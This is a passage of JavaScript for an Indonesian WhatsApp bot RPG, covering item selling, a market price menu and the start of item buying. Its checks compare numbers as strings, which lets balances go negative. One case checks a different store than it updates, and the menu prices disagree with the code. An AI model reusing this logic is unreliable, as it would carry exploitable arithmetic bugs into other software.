        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang22 = Number(parseInt(args[1]) * 40000)
        let jumlh22 = Number(args[1])
        if (`${global.db.erpg[m.sender].panda}` < `${jumlh22}`) return reply(`*Panda Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang22
        global.db.erpg[m.sender].panda -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Panda: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang22}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'buaya':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang23 = Number(parseInt(args[1]) * 20000)
        let jumlh23 = Number(args[1])
        if (`${global.db.erpg[m.sender].buaya}` < `${jumlh23}`) return reply(`*Buaya Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang23
        global.db.erpg[m.sender].buaya -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Buaya: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang23}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'kerbau':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang24 = Number(parseInt(args[1]) * 40000)
        let jumlh24 = Number(args[1])
        if (`${global.db.erpg[m.sender].kerbau}` < `${jumlh24}`) return reply(`*Kerbau Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang24
        global.db.erpg[m.sender].kerbau -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Kerbau: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang24}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'monyet':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang25 = Number(parseInt(args[1]) * 20000)
        let jumlh25 = Number(args[1])
        if (`${global.db.erpg[m.sender].monyet}` < `${jumlh25}`) return reply(`*Monyet Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang25
        global.db.erpg[m.sender].monyet -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Monyet: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang25}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'babihutan':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang26 = Number(parseInt(args[1]) * 20000)
        let jumlh26 = Number(args[1])
        if (`${global.db.erpg[m.sender].babihutan}` < `${jumlh26}`) return reply(`*Babi Hutan Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang26
        global.db.erpg[m.sender].babihutan -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Babi Hutan: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang26}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'babi':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang27 = Number(parseInt(args[1]) * 20000)
        let jumlh27 = Number(args[1])
        if (`${global.db.erpg[m.sender].babi}` < `${jumlh27}`) return reply(`*Babi Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang27
        global.db.erpg[m.sender].babi -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Babi: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang27}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'limit':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang28 = Number(parseInt(args[1]) * 100)
        let jumlh28 = Number(args[1])
        if (`${db.users[m.sender].limit}` < `${jumlh28}`) return reply(`*Limit Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang28
        db.users[m.sender].limit -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Limit: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang28}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'glimit':
      case 'gamelimit':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang29 = Number(parseInt(args[1]) * 100)
        let jumlh29 = Number(args[1])
        if (`${db.users[m.sender].glimit}` < `${jumlh29}`) return reply(`*Game Limit Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang29
        global.db.erpg[m.sender].glimit -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Game Limit: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang29}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'paus':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang30 = Number(parseInt(args[1]) * 78000)
        let jumlh30 = Number(args[1])
        if (`${global.db.erpg[m.sender].paus}` < `${jumlh30}`) return reply(`*Paus Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang30
        global.db.erpg[m.sender].paus -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Paus: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang30}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'kepiting':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang31 = Number(parseInt(args[1]) * 2000)
        let jumlh31 = Number(args[1])
        if (`${global.db.erpg[m.sender].kepiting}` < `${jumlh31}`) return reply(`*Kepiting Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang31
        global.db.erpg[m.sender].kepiting -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Kepiting: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang31}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'gurita':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang32 = Number(parseInt(args[1]) * 3000)
        let jumlh32 = Number(args[1])
        if (`${global.db.erpg[m.sender].gurita}` < `${jumlh32}`) return reply(`*Gurita Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang32
        global.db.erpg[m.sender].gurita -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Gurita: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang32}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'cumi':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang33 = Number(parseInt(args[1]) * 2000)
        let jumlh33 = Number(args[1])
        if (`${global.db.erpg[m.sender].cumi}` < `${jumlh33}`) return reply(`*Cumi Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang33
        global.db.erpg[m.sender].cumi -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Cumi: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang33}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'buntal':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang34 = Number(parseInt(args[1]) * 1000)
        let jumlh34 = Number(args[1])
        if (`${global.db.erpg[m.sender].buntal}` < `${jumlh34}`) return reply(`*Buntal Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang34
        global.db.erpg[m.sender].buntal -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Buntal: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang34}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'dory':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang35 = Number(parseInt(args[1]) * 7000)
        let jumlh35 = Number(args[1])
        if (`${global.db.erpg[m.sender].dory}` < `${jumlh35}`) return reply(`*Dory Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang35
        global.db.erpg[m.sender].dory -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Dory: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang35}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'lumba':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang36 = Number(parseInt(args[1]) * 67400)
        let jumlh36 = Number(args[1])
        if (`${global.db.erpg[m.sender].lumba}` < `${jumlh36}`) return reply(`*Lumba" Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang36
        global.db.erpg[m.sender].lumba -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Lumba": ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang36}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'lobster':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang37 = Number(parseInt(args[1]) * 3000)
        let jumlh37 = Number(args[1])
        if (`${global.db.erpg[m.sender].lobster}` < `${jumlh37}`) return reply(`*Lobster Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang37
        global.db.erpg[m.sender].lobster -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Lobster: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang37}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'hiu':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang38 = Number(parseInt(args[1]) * 87500)
        let jumlh38 = Number(args[1])
        if (`${global.db.erpg[m.sender].hiu}` < `${jumlh38}`) return reply(`*Hiu Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang38
        global.db.erpg[m.sender].hiu -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Hiu: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang38}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'udang':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang39 = Number(parseInt(args[1]) * 1000)
        let jumlh39 = Number(args[1])
        if (`${global.db.erpg[m.sender].udang}` < `${jumlh39}`) return reply(`*Udang Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang39
        global.db.erpg[m.sender].udang -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Udang: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang39}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'orca':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang40 = Number(parseInt(args[1]) * 12000)
        let jumlh40 = Number(args[1])
        if (`${global.db.erpg[m.sender].orca}` < `${jumlh40}`) return reply(`*Orca Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang40
        global.db.erpg[m.sender].orca -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Orca: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang40}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'potion':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang41 = Number(parseInt(args[1]) * 1000)
        let jumlh41 = Number(args[1])
        if (`${global.db.erpg[m.sender].potion}` < `${jumlh41}`) return reply(`*Potion Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang41
        global.db.erpg[m.sender].potion -= parseInt(args[1])
        reply(`*MARKET - JUALğŸ›ï¸*\n\n*Item Terjual:*\n  ${vircion} â€¢ Potion: ${args[1]}\n\n*Penghasilan:*\n  ${vircion} â€¢ Saldo: ${uang41}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      default:
        let teks = `------- Â» *ğŸ›ï¸ MARKET ğŸ›ï¸* Â« -------\n\n*Users Itemsâš”*\n  ${vircion} â€¢ rumah +Rp 2.000.000\n  ${vircion} â€¢ potion +Rp 1.000\n  ${vircion} â€¢ Limit: +Rp 1.000\n  ${vircion} â€¢ GameLimit: +Rp 1.000\n  ${vircion} â€¢ emas +Rp 20.500\n  ${vircion} â€¢ besi +Rp 1.500\n  ${vircion} â€¢ batubara +Rp 1.000\n  ${vircion} â€¢ perak +Rp 2.000\n  ${vircion} â€¢ kayu +Rp 500\n  ${vircion} â€¢ emerald +Rp 20.000\n  ${vircion} â€¢ diamond +Rp 50.000\n  ${vircion} â€¢ botol +Rp 200\n  ${vircion} â€¢ kardus +Rp 200\n  ${vircion} â€¢ kaleng +Rp 200\n  ${vircion} â€¢ gelas +Rp 200\n  ${vircion} â€¢ plastik +Rp 200\n\n*Hewan DaratğŸŒ¿*\n  ${vircion} â€¢ ayam +Rp 500\n  ${vircion} â€¢ sapi +Rp 3.000\n  ${vircion} â€¢ domba +Rp 2.000\n  ${vircion} â€¢ banteng +Rp 30.000\n  ${vircion} â€¢ gajah +Rp 70.000\n  ${vircion} â€¢ harimau +Rp 100.000\n  ${vircion} â€¢ kambing +Rp 30000\n  ${vircion} â€¢ panda +Rp 40.000\n  ${vircion} â€¢ buaya +Rp 20.000\n  ${vircion} â€¢ kerbau +Rp 40.000\n  ${vircion} â€¢ monyet +Rp 20.000\n  ${vircion} â€¢ babihutan +Rp 40.000\n  ${vircion} â€¢ babi +Rp 20.000\n\n*Hewan Laut ğŸŒŠ*\n  ${vircion} â€¢ ikan +Rp 200\n  ${vircion} â€¢ paus +Rp 78000500\n  ${vircion} â€¢ kepiting +Rp 2000\n  ${vircion} â€¢ gurita +Rp 3000\n  ${vircion} â€¢ cumi +Rp 2000\n  ${vircion} â€¢ buntal +Rp 1000\n  ${vircion} â€¢ dory +Rp 7000\n  ${vircion} â€¢ lumba +Rp 674000\n  ${vircion} â€¢ lobster +Rp 3000\n  ${vircion} â€¢ hiu +Rp 8750000\n  ${vircion} â€¢ udang +Rp 1000\n  ${vircion} â€¢ orca +Rp 12000\n_____________________________\n\n*Tutorials :*\nâ  To Sell Items:\n.sell [item] [quantity]\nâ–§ Example:\n.sell emas 10`
        sock.sendMessage(m.chat, { text: teks, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "SELLING MARKET", body: 'Sell goods to earn money', thumbnailUrl: "https://telegra.ph/file/df72d0f6cc35b7581594b.jpg", sourceUrl: "-", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
    }
    break
  }

  case 'shop':
  case 'buy':
  case 'beli': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (text.includes('-')) return reply('Nominal Tidak valid!!')
    let jual = args[0]
    switch (jual) {
      case 'emas':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 20500)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].emas += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Emas: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'besi':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang2 = Number(parseInt(args[1]) * 1500)
        let jumlh2 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang2}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang2
        global.db.erpg[m.sender].besi += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Besi: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang2}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'batubara':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang3 = Number(parseInt(args[1]) * 1000)
        let jumlh3 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang3}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang3
        global.db.erpg[m.sender].batubara += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Batu Bara: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang3}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'perak':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang4 = Number(parseInt(args[1]) * 2000)
        let jumlh4 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang4}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang4
        global.db.erpg[m.sender].perak += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Perak: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang4}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'kayu':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang5 = Number(parseInt(args[1]) * 500)
        let jumlh5 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang5}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang5
        global.db.erpg[m.sender].kayu += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Kayu: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang5}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'ayam':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang6 = Number(parseInt(args[1]) * 500)
        let jumlh6 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang6}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang6
        global.db.erpg[m.sender].ayam += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Ayam: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang6}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'sapi':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang7 = Number(parseInt(args[1]) * 3000)
        let jumlh7 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang7}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang7
        global.db.erpg[m.sender].sapi += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Sapi: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang7}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'domba':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang8 = Number(parseInt(args[1]) * 2000)
        let jumlh8 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang8}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang8
        global.db.erpg[m.sender].domba += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Domba: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang8}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'ikan':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang9 = Number(parseInt(args[1]) * 200)
        let jumlh9 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang9}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang9
        global.db.erpg[m.sender].ikan += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Ikan: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang9}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'rumah':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang10 = Number(parseInt(args[1]) * 2000000)
        let jumlh10 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang10}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang10
        global.db.erpg[m.sender].rumah += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ rumah: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang10}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'emerald':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang11 = Number(parseInt(args[1]) * 20000)
        let jumlh11 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang11}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang11
        global.db.erpg[m.sender].emerald += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Emerald: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang11}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'diamond':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
